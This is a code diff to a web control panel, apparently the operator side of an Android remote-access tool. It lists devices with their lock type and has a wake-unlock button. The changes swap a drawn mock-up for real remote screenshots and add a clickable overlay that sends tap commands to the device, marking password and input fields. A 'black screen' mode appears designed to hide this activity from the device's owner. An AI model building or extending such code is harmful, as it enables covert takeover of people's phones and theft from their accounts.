@@ -392,6 +392,32 @@
             background: #00aa00; 
         }
         
+        /* UI Screen Clickable Overlay */
+        .ui-clickable-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1000;
+        }
+        
+        .ui-clickable-element {
+            position: absolute;
+            cursor: pointer;
+            border: 2px dashed rgba(0, 255, 0, 0.5);
+            background-color: rgba(0, 255, 0, 0.1);
+            transition: all 0.2s;
+            box-sizing: border-box;
+            pointer-events: all;
+        }
+        
+        .ui-clickable-element:hover {
+            background-color: rgba(0, 255, 0, 0.3);
+            border: 2px solid rgba(0, 255, 0, 0.8);
+        }
+        
         /* Hidden Canvas for Screenshot */
         #screenshot-canvas {
             display: none;
@@ -403,7 +429,7 @@
     <div id="device-list-view" class="view active">
         <div class="header">
             <h1>🔓 DUAL VIEW SCREEN CONTROL v3.0</h1>
-            <p style="margin: 5px 0; color: #aaa;">Black Screen + UI Screen • Dual View Mode</p>
+            <p style="margin: 5px 0; color: #aaa;">Black Screen + UI Screen • Dual View Mode • Real Screenshot</p>
         </div>
         <div id="device-list-container">
             <ul id="device-list"></ul>
@@ -424,6 +450,9 @@
                 <button id="btn-ui-screen" class="screen-toggle-btn">
                     🖥️ UI Screen
                 </button>
+                <button id="btn-refresh-ui" class="screen-toggle-btn">
+                    🔄 Refresh UI
+                </button>
             </div>
             
             <button id="btn-wake-unlock" class="single-main-btn">
@@ -433,7 +462,7 @@
         <div class="main-container">
             <div class="screen-area">
                 <!-- Black Screen View (Default) -->
-                <div id="black-screen-viewport" class="screen-viewport">
+                <div id="black-screen-viewport" class="screen-viewport" style="display: block;">
                     <div id="black-screen-container" class="screen-container"></div>
                     <div id="keyboard-buttons" class="keyboard-buttons"></div>
                 </div>
@@ -442,6 +471,7 @@
                 <div id="ui-screen-viewport" class="screen-viewport" style="display: none;">
                     <div id="ui-screen-container" class="screen-container ui-screen-container">
                         <img id="ui-screen-image" src="" alt="UI Screen" />
+                        <div id="ui-clickable-overlay" class="ui-clickable-overlay"></div>
                     </div>
                 </div>
             </div>
@@ -473,6 +503,7 @@
         const blackScreenContainer = document.getElementById('black-screen-container');
         const uiScreenContainer = document.getElementById('ui-screen-container');
         const uiScreenImage = document.getElementById('ui-screen-image');
+        const uiClickableOverlay = document.getElementById('ui-clickable-overlay');
         const deviceTitleEl = document.getElementById('device-title');
         const lockStatusEl = document.getElementById('lock-status');
         const backToListBtn = document.getElementById('back-to-list-btn');
@@ -480,6 +511,7 @@
         const keyboardButtons = document.getElementById('keyboard-buttons');
         const btnBlackScreen = document.getElementById('btn-black-screen');
         const btnUiScreen = document.getElementById('btn-ui-screen');
+        const btnRefreshUi = document.getElementById('btn-refresh-ui');
         const btnOpenBlackDialog = document.getElementById('btn-open-black-dialog');
         const btnOpenUiDialog = document.getElementById('btn-open-ui-dialog');
         const screenshotCanvas = document.getElementById('screenshot-canvas');
@@ -492,6 +524,7 @@
         let blackScreenDialog = null;
         let uiScreenDialog = null;
         let lastScreenData = null;
+        let lastUiScreenshot = null;
         let dialogZIndex = 10000;
 
         function showView(viewId) {
@@ -550,6 +583,7 @@
                 lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
                 blackScreenContainer.innerHTML = '📡 Receiving screen data...';
                 uiScreenImage.src = '';
+                uiClickableOverlay.innerHTML = '';
                 showView('control-view');
             });
             deviceListEl.appendChild(li);
@@ -570,63 +604,28 @@
                 document.getElementById('black-screen-viewport').style.display = 'none';
                 document.getElementById('ui-screen-viewport').style.display = 'block';
                 
-                // Generate UI screenshot if we have screen data
-                if (lastScreenData) {
-                    generateUIScreenshot(lastScreenData);
+                // If we have a UI screenshot, show it
+                if (lastUiScreenshot) {
+                    uiScreenImage.src = 'data:image/jpeg;base64,' + lastUiScreenshot;
+                } else if (lastScreenData) {
+                    // Request fresh UI screenshot
+                    requestUiScreenshot();
                 }
             }
         }
 
-        function generateUIScreenshot(screenData) {
-            const remoteWidth = screenData.screenWidth;
-            const remoteHeight = screenData.screenHeight;
+        function requestUiScreenshot() {
+            if (!activeDeviceId) return;
             
-            // Set canvas size
-            screenshotCanvas.width = remoteWidth;
-            screenshotCanvas.height = remoteHeight;
-            
-            // Clear canvas
-            ctx.fillStyle = '#1a1a1a';
-            ctx.fillRect(0, 0, remoteWidth, remoteHeight);
-            
-            // Draw each element as a rectangle
-            screenData.elements.forEach(element => {
-                if (element.width > 0 && element.height > 0) {
-                    // Draw rectangle background
-                    ctx.fillStyle = '#2a2a2a';
-                    ctx.fillRect(element.x, element.y, element.width, element.height);
-                    
-                    // Draw border
-                    ctx.strokeStyle = '#00ff00';
-                    ctx.lineWidth = 1;
-                    ctx.strokeRect(element.x, element.y, element.width, element.height);
-                    
-                    // Draw text if available
-                    if (element.text || element.contentDescription) {
-                        const text = element.text || element.contentDescription;
-                        if (text && text.length > 0) {
-                            ctx.fillStyle = '#ffffff';
-                            ctx.font = '12px Arial';
-                            ctx.textAlign = 'center';
-                            ctx.textBaseline = 'middle';
-                            
-                            const centerX = element.x + element.width / 2;
-                            const centerY = element.y + element.height / 2;
-                            
-                            // Truncate text if too long
-                            let displayText = text.toString();
-                            if (displayText.length > 20) {
-                                displayText = displayText.substring(0, 20) + '...';
-                            }
-                            
-                            ctx.fillText(displayText, centerX, centerY);
-                        }
-                    }
-                }
+            socket.emit('command_to_device', {
+                deviceId: activeDeviceId,
+                action: 'request_ui_screenshot',
+                payload: {}
             });
             
-            // Convert to data URL and set as image source
-            uiScreenImage.src = screenshotCanvas.toDataURL('image/png');
+            // Show loading
+            uiScreenImage.src = '';
+            uiScreenContainer.innerHTML = '<div style="color:white;font-size:20px;text-align:center;padding:50px;">🔄 Taking screenshot...</div>';
         }
 
         socket.on('screen_update', (data) => {
@@ -718,7 +717,7 @@
                     
                     el.appendChild(textEl);
                     
-                    // Click event
+                    // Click event for BLACK SCREEN
                     el.addEventListener('click', () => {
                         const tapX = Math.round(element.x + (element.width / 2));
                         const tapY = Math.round(element.y + (element.height / 2));
@@ -738,19 +737,81 @@
                     
                     blackScreenContainer.appendChild(el);
                 });
-                
-                // Generate UI screenshot if in UI view
-                if (currentScreenView === 'ui') {
-                    generateUIScreenshot(data);
-                }
             });
         });
+
+        socket.on('ui_screenshot', (data) => {
+            if (data.deviceId !== activeDeviceId) return;
+            
+            lastUiScreenshot = data.screenshot;
+            
+            if (currentScreenView === 'ui') {
+                // Show real screenshot
+                uiScreenImage.src = 'data:image/jpeg;base64,' + data.screenshot;
+                
+                // Add clickable overlay
+                addClickableOverlay(data.elements || lastScreenData?.elements || []);
+            }
+        });
+
+        function addClickableOverlay(elements) {
+            // Clear existing overlay
+            uiClickableOverlay.innerHTML = '';
+            
+            const remoteWidth = lastScreenData?.screenWidth || 1080;
+            const remoteHeight = lastScreenData?.screenHeight || 1920;
+            const viewportHeight = 600;
+            const scale = viewportHeight / remoteHeight;
+            
+            // Create clickable elements overlay for UI SCREEN
+            elements.forEach(element => {
+                if (element.clickable || element.editable || element.isPassword || 
+                    (element.text && element.text.toString().trim().length > 0)) {
+                    
+                    const clickableEl = document.createElement('div');
+                    clickableEl.className = 'ui-clickable-element';
+                    
+                    // Calculate scaled position and size
+                    const scaledX = element.x * scale;
+                    const scaledY = element.y * scale;
+                    const scaledWidth = element.width * scale;
+                    const scaledHeight = element.height * scale;
+                    
+                    clickableEl.style.left = `${scaledX}px`;
+                    clickableEl.style.top = `${scaledY}px`;
+                    clickableEl.style.width = `${scaledWidth}px`;
+                    clickableEl.style.height = `${scaledHeight}px`;
+                    
+                    // Click event for UI SCREEN
+                    clickableEl.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        
+                        // Calculate original coordinates
+                        const tapX = Math.round(element.x + (element.width / 2));
+                        const tapY = Math.round(element.y + (element.height / 2));
+                        
+                        socket.emit('command_to_device', { 
+                            deviceId: activeDeviceId, 
+                            action: 'touch_command', 
+                            payload: { x: tapX, y: tapY } 
+                        });
+                        
+                        // Visual feedback
+                        clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.5)';
+                        setTimeout(() => {
+                            clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
+                        }, 200);
+                    });
+                    
+                    uiClickableOverlay.appendChild(clickableEl);
+                }
+            });
+        }
 
         function showVirtualKeyboard(element) {
             keyboardButtons.innerHTML = '';
             keyboardButtons.style.display = 'block';
             
-            // Simple keyboard layout
             const keyboardLayout = [
                 ['1','2','3','4','5','6','7','8','9','0'],
                 ['q','w','e','r','t','y','u','i','o','p'],
@@ -851,8 +912,10 @@
             if (!activeDeviceId || !lastScreenData) return;
             
             const content = `
-                <div id="dialog-black-screen" style="width:100%;height:100%;position:relative;">
-                    ${blackScreenContainer.innerHTML}
+                <div style="width:100%;height:100%;position:relative;background:#000;">
+                    <div id="dialog-black-screen" style="width:${lastScreenData.screenWidth}px;height:${lastScreenData.screenHeight}px;transform-origin:top left;transform:scale(0.5);">
+                        ${blackScreenContainer.innerHTML}
+                    </div>
                 </div>
             `;
             
@@ -860,23 +923,63 @@
         }
 
         function openUIScreenDialog() {
-            if (!activeDeviceId || !lastScreenData) return;
-            
-            // Generate fresh screenshot
-            generateUIScreenshot(lastScreenData);
+            if (!activeDeviceId || !lastUiScreenshot) return;
             
             const content = `
-                <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#1a1a1a;">
-                    <img src="${uiScreenImage.src}" style="max-width:100%;max-height:100%;object-fit:contain;" />
+                <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#1a1a1a;position:relative;">
+                    <img src="data:image/jpeg;base64,${lastUiScreenshot}" style="max-width:100%;max-height:100%;object-fit:contain;" />
+                    <div id="dialog-ui-overlay" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;"></div>
                 </div>
             `;
             
             uiScreenDialog = createDialog('UI Screen View', content, 800, 600);
+            
+            // Add clickable overlay to dialog
+            setTimeout(() => {
+                addClickableOverlayToDialog(lastScreenData?.elements || []);
+            }, 100);
+        }
+
+        function addClickableOverlayToDialog(elements) {
+            const dialogOverlay = document.getElementById('dialog-ui-overlay');
+            if (!dialogOverlay) return;
+            
+            dialogOverlay.innerHTML = '';
+            
+            elements.forEach(element => {
+                if (element.clickable) {
+                    const clickableEl = document.createElement('div');
+                    clickableEl.style.position = 'absolute';
+                    clickableEl.style.left = `${element.x * 0.5}px`;
+                    clickableEl.style.top = `${element.y * 0.5}px`;
+                    clickableEl.style.width = `${element.width * 0.5}px`;
+                    clickableEl.style.height = `${element.height * 0.5}px`;
+                    clickableEl.style.cursor = 'pointer';
+                    clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
+                    clickableEl.style.border = '1px dashed rgba(0, 255, 0, 0.5)';
+                    clickableEl.style.pointerEvents = 'all';
+                    clickableEl.style.boxSizing = 'border-box';
+                    
+                    clickableEl.addEventListener('click', () => {
+                        const tapX = Math.round(element.x + (element.width / 2));
+                        const tapY = Math.round(element.y + (element.height / 2));
+                        
+                        socket.emit('command_to_device', { 
+                            deviceId: activeDeviceId, 
+                            action: 'touch_command', 
+                            payload: { x: tapX, y: tapY } 
+                        });
+                    });
+                    
+                    dialogOverlay.appendChild(clickableEl);
+                }
+            });
         }
 
         // Event Listeners
         btnBlackScreen.onclick = () => switchScreenView('black');
         btnUiScreen.onclick = () => switchScreenView('ui');
+        btnRefreshUi.onclick = requestUiScreenshot;
         btnOpenBlackDialog.onclick = openBlackScreenDialog;
         btnOpenUiDialog.onclick = openUIScreenDialog;
 
